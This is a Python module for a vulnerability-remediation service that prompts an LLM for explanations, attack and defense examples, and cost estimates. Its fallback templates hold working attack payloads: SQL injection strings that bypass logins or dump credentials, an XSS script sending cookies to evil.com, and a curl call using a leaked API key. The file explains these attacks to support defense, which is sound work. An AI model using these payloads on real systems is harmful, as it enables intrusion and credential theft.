from services.smart_llm_router import smart_router
import json
import os

BREACH_DATA_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "breach_examples.json")


def financial_range_for_severity(severity: str, vuln_type: str = "") -> tuple:
    """Heuristic incident cost range when no breach DB match exists."""
    s = (severity or "low").lower()
    if s == "critical":
        return (25_000, 2_000_000)
    if s == "high":
        return (10_000, 500_000)
    if s == "medium":
        return (3_000, 150_000)
    return (500, 25_000)


def ensure_financial_fields(result: dict, finding: dict) -> None:
    """Fill money_loss_* from breach data, severity heuristics, or vuln type defaults."""
    vt = finding.get("vuln_type", "") or ""
    sev = finding.get("severity", "medium") or "medium"
    breach = BREACH_EXAMPLES.get(vt, {})
    if breach:
        result.setdefault("money_loss_min", breach.get("min", 5000))
        result.setdefault("money_loss_max", breach.get("max", 500000))
        result.setdefault("breach_examples", breach.get("examples", []))
    else:
        lo, hi = financial_range_for_severity(sev, vt)
        result.setdefault("money_loss_min", lo)
        result.setdefault("money_loss_max", hi)
        result.setdefault("breach_examples", [])
try:
    with open(BREACH_DATA_PATH, "r") as f:
        BREACH_EXAMPLES = json.load(f)
except:
    BREACH_EXAMPLES = {}

class AIFixService:

    def __init__(self):
        self.llm = smart_router

    def generate_fix(self, finding: dict) -> dict:
        
        location = finding.get("file_path") or finding.get("url") or "unknown"
        evidence = (finding.get("evidence") or "")[:400]
        
        system = """You are a senior penetration tester and
security engineer. You explain vulnerabilities clearly.
Respond ONLY with valid JSON. No markdown outside JSON."""
        
        vuln_type = finding.get("vuln_type","Unknown")
        severity = finding.get("severity","medium")
        description = (finding.get("description") or "")[:400]

        prompt = """Analyze this security vulnerability and
respond with ONLY this exact JSON structure:
{
  "layman_explanation": "Explain in 2 sentences what this
    vulnerability is, as if explaining to someone who has
    never heard of security. Use an analogy. No jargon.",
  
  "what_is_happening": "Technical explanation in 2-3
    sentences. What exactly is wrong and why.",
  
  "attack_examples": [
    {
      "name": "Basic attack name",
      "payload": "exact payload syntax an attacker would use",
      "explanation": "what this payload does",
      "impact": "what happens if this succeeds"
    },
    {
      "name": "Advanced attack name",
      "payload": "more advanced payload",
      "explanation": "what this does",
      "impact": "what the attacker gains"
    }
  ],
  
  "defense_examples": [
    {
      "method": "Method name (e.g. Parameterized Queries)",
      "code_before": "exact vulnerable code pattern",
      "code_after": "exact secure code pattern",
      "language": "python|javascript|php|java|etc",
      "explanation": "why this fix works"
    },
    {
      "method": "Second defense method",
      "code_before": "...",
      "code_after": "...",
      "language": "...",
      "explanation": "..."
    }
  ],
  
  "services_to_use": [
    "Library or service name: why it helps",
    "Another tool: what it does"
  ],
  
  "key_terms": ["term1", "term2", "term3"],
  
  "cvss_score": 8.5,
  
  "effort_minutes": 20,
  
  "confidence": 90,
  
  "ide_prompt": "You are fixing a security vulnerability.
    [VULNERABILITY]: {vuln_type}
    [FILE/LOCATION]: {location}
    [WHAT IS WRONG]: exact technical description of the bug.
    [EVIDENCE FROM SCAN]: {evidence}
    [ATTACK THAT WORKS]: specific attack payload with syntax.
    [HOW TO FIX]: exact step by step fix instructions.
    [SECURE PATTERN TO USE]: the safe code pattern.
    [CODE EXAMPLE]: before and after code.
    [VERIFICATION]: how to test the fix worked.
    Be specific to this exact file and location.
    Generate the complete fixed code, not just a snippet.",
  
  "ai_suggestion": "One line starting with action verb"
}

Vulnerability:
Type: {vuln_type}
Severity: {severity}
Location: {location}
Evidence: {evidence}
Description: {description}"""

        prompt = prompt.replace("{vuln_type}", vuln_type)\
                       .replace("{severity}", severity)\
                       .replace("{location}", location)\
                       .replace("{evidence}", evidence)\
                       .replace("{description}", description)

        
        try:
            result = self.llm.chat_json(
                [{"role":"user","content":prompt}],
                system, max_tokens=2000
            )
            if "error" not in result:
                ensure_financial_fields(result, finding)
                if not (result.get("ide_prompt") or "").strip():
                    result["ide_prompt"] = self._stub_ide_prompt(finding)
                return result
        except:
            pass
        
        out = self._enhanced_fallback(finding)
        ensure_financial_fields(out, finding)
        if not (out.get("ide_prompt") or "").strip():
            out["ide_prompt"] = self._stub_ide_prompt(finding)
        return out

    def _stub_ide_prompt(self, finding: dict) -> str:
        loc = finding.get("file_path") or finding.get("url") or "unknown"
        line = finding.get("line_number")
        line_bit = f" around line {line}" if line else ""
        ev = (finding.get("evidence") or "")[:600]
        return (
            f"Fix this security issue in the codebase.\n"
            f"- Type: {finding.get('vuln_type', 'Unknown')}\n"
            f"- Location: {loc}{line_bit}\n"
            f"- Description: {finding.get('description', '')}\n"
            f"- Scanner evidence:\n{ev}\n"
            f"Provide a minimal secure patch, explain the change, and suggest a test."
        )

    def _enhanced_fallback(self, finding: dict) -> dict:
        """Rich fallback templates for common vulnerabilities."""
        
        TEMPLATES = {
            "SQL Injection": {
                "layman_explanation": "Think of SQL injection like someone exploiting a 'fill in the blank' form. Instead of filling in their name, the attacker fills in secret commands that trick the database into giving away all its information — like a master key hidden in plain sight.",
                "attack_examples": [
                    {"name":"Auth Bypass","payload":"admin'--","explanation":"Closes the SQL string and comments out the password check","impact":"Login without knowing the password"},
                    {"name":"Data Dump","payload":"' UNION SELECT username,password FROM users--","explanation":"Appends a second query to steal all user credentials","impact":"Full database exposure"},
                ],
                "defense_examples": [
                    {"method":"Parameterized Queries","code_before":"query = 'SELECT * FROM users WHERE name=' + username","code_after":"query = 'SELECT * FROM users WHERE name=?'\ncursor.execute(query, [username])","language":"python","explanation":"User input never touches SQL string — treated as data, not code"},
                    {"method":"ORM Usage","code_before":"db.execute(f'SELECT * FROM users WHERE id={user_id}')","code_after":"User.query.filter_by(id=user_id).first()","language":"python","explanation":"ORM handles parameterization automatically"}
                ],
                "services_to_use": ["SQLAlchemy ORM: handles parameterization automatically","OWASP ESAPI: input validation library","Prepared Statements: built into every database driver"],
                "key_terms": ["Parameterized Query","Prepared Statement","Input Validation","ORM"],
                "cvss_score": 9.8,
                "effort_minutes": 20,
                "confidence": 95,
            },
            "Cross-Site Scripting": {
                "layman_explanation": "XSS is like a stranger slipping a note into your mailbox that, when you open it, automatically calls all your contacts pretending to be you. An attacker injects code into a website that runs in other users' browsers without them knowing.",
                "attack_examples": [
                    {"name":"Cookie Theft","payload":"<script>fetch('https://evil.com?c='+document.cookie)</script>","explanation":"Sends victim's session cookies to attacker's server","impact":"Account takeover without needing password"},
                    {"name":"DOM XSS","payload":"javascript:alert(document.cookie)","explanation":"Executes in browser via URL","impact":"Steal data, redirect users, modify page content"},
                ],
                "defense_examples": [
                    {"method":"Output Encoding","code_before":"element.innerHTML = userInput","code_after":"element.textContent = userInput","language":"javascript","explanation":"textContent never interprets HTML — treats everything as text"},
                    {"method":"Content Security Policy","code_before":"# No CSP header set","code_after":"response.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self'\"","language":"python","explanation":"CSP blocks inline scripts even if XSS payload is injected"}
                ],
                "services_to_use": ["DOMPurify: sanitizes HTML before rendering","helmet.js: sets security headers including CSP automatically","OWASP Java HTML Sanitizer: server-side HTML cleaning"],
                "key_terms": ["Output Encoding","Content Security Policy","DOM Sanitization","HttpOnly Cookie"],
                "cvss_score": 7.5,
                "effort_minutes": 10,
                "confidence": 92,
            },
            "Hardcoded Secret": {
                "layman_explanation": "Think of this like leaving the front door key under the mat for anyone to find. A secret password or API key was found directly exposed in the code where attackers can see it and use it to access other services.",
                "attack_examples": [
                    {"name":"Direct Access","payload":"curl -H 'Authorization: Bearer <key_found>' https://api.service.com","explanation":"Attacker uses the found key to access third party services","impact":"Data breach or massive billing charges on the third-party account"},
                ],
                "defense_examples": [
                    {"method":"Environment Variables","code_before":"GOOGLE_API_KEY = 'GOOG*******************'\nclient = connect(GOOGLE_API_KEY)","code_after":"import os\nGOOGLE_API_KEY = os.getenv('GOOGLE_API_KEY')\nclient = connect(GOOGLE_API_KEY)","language":"python","explanation":"Secrets belong in the environment, not in source code"},
                    {"method":"Secrets Manager","code_before":"# hardcoded in config\ntoken: 'ghp_xxxxx'","code_after":"# fetched via AWS SecretsManager / HashiCorp Vault","language":"python","explanation":"Use a dedicated secrets manager to inject keys at runtime"}
                ],
                "services_to_use": ["HashiCorp Vault: enterprise secret storage","AWS Secrets Manager: cloud native secrets provisioning","dotenv: local development environment variable loading"],
                "key_terms": ["Hardcoded Secret", "Environment Variable", "Secret Scanning"],
                "cvss_score": 9.5,
                "effort_minutes": 15,
                "confidence": 99,
            }
        }
        
        base = TEMPLATES.get(finding.get("vuln_type",""), {
            "layman_explanation": f"A {finding.get('vuln_type','security')} issue was found that could allow attackers to compromise the system.",
            "attack_examples": [],
            "defense_examples": [],
            "services_to_use": [],
            "key_terms": [],
            "cvss_score": 5.0,
            "effort_minutes": 30,
            "confidence": 60,
        })
        lo, hi = financial_range_for_severity(
            finding.get("severity", "medium"), finding.get("vuln_type", "")
        )
        bex = BREACH_EXAMPLES.get(finding.get("vuln_type", ""), {})
        return {
            **base,
            "ai_suggestion": f"Fix the {finding.get('vuln_type')} by applying secure coding patterns",
            "ide_prompt": self._stub_ide_prompt(finding),
            "what_is_happening": finding.get("description","")[:300],
            "money_loss_min": bex.get("min", lo),
            "money_loss_max": bex.get("max", hi),
            "breach_examples": bex.get("examples", []),
        }
